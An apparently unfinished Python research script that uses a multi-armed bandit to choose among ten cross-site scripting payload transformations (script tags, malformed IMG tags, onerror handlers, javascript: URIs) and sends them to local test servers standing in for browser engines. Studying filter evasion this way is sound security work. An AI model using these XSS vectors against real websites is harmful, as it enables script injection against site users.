# import requests

# r = requests.get('http://127.0.0.1:8000/search/?q=test') # test should be the payload

# print(r.text)

import requests
import random
from bfts.bandit import Bandit

random.seed(1)

def n_arms():
    return len(XSS_transformations())

def XSS_transformations():
    return [script_tags, non_alpha_non_digit, malformed_IMG_tags, on_error_alert, extraneous_open_brackets, end_title_tag, input_image, body_image, IMG_Dynsrc, IMG_Lowsrc] # fill this list with functions that take one argument (a payload) and transform it in a certain way

def XSS_bandit():
    base_payload = "alert('Hi!')"
    n = n_arms
    transformations_ = XSS_transformations()
    transformed_payloads = list(transformation(base_payload) for transformation in transformations_)
    def reward_fn(payload_):
        return lambda: send_and_get_result(payload_)
    arms = list(map(reward_fn, transformed_payloads))
    return Bandit(arms)
    
def send_and_get_result(payload_):
    engine_to_ip_dict = {"chromium": "127.0.0.1:8000", "safari": "127.0.0.1:8001", "firefox": "127.0.0.1:8002"}

    # 1st choose which server to send it to (which browser engine)
    engines = ["chromium", "safari", "firefox"]
    engine = random.choice(engines)
    ip = engine_to_ip_dict[engine]

    # 2nd send the payload to that server
    full_ip = ip + "/search/?q=" + payload_
    r = requests.get(full_ip) # TODO: this does not give the right info back yet, update that in each of the servers

    # 3rd receive a response of that server (this will be either a 1 (success) or 0 (fail))
    # 4th return this response

r = requests.get('http://127.0.0.1:8000/search/?q=test') # test should be the payload

print(r.text)

# Definition of transformations:

def script_tags(base_payload: str):
    return "<script>" + base_payload + "</script>"

def non_alpha_non_digit(base_payload: str):
    return "<script\XSS>" + base_payload + "</script>"

def malformed_IMG_tags(base_payload: str):
    return "<IMG \"\"\"><script>" + base_payload + "</script>\"\\>"

def on_error_alert(base_payload: str):
    return "<IMG SRC=/ onerror=\"" + base_payload + "\"></img>" # can also change the text inside the alert to String.fromCharCode(num, num, num) if you want to completely remove quotes from the payload

def extraneous_open_brackets(base_payload: str):
    return "<script>" + base_payload + ";//\<</script>"

def end_title_tag(base_payload: str):
    return "</TITLE><script>" + base_payload + ";</script>"

def input_image(base_payload: str):
    return "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:" + base_payload + ";\">"

def body_image(base_payload: str):
    return "<BODY BACKGROUND=\"javascript:" + base_payload + "\">"

def IMG_Dynsrc(base_payload: str):
    return "<IMG DYNSRC=\"javascript:" + base_payload + "\">"

def IMG_Lowsrc(base_payload: str):
    return "<IMG LOWSRC=\"javascript:" + base_payload + "\">"

'''
# potentially also: 
#                   - all "click me" XSS
#                   - no closing script tags
                    - protocol resolution in script tags
                    - Half Open HTML/JavaScript XSS Vector
'''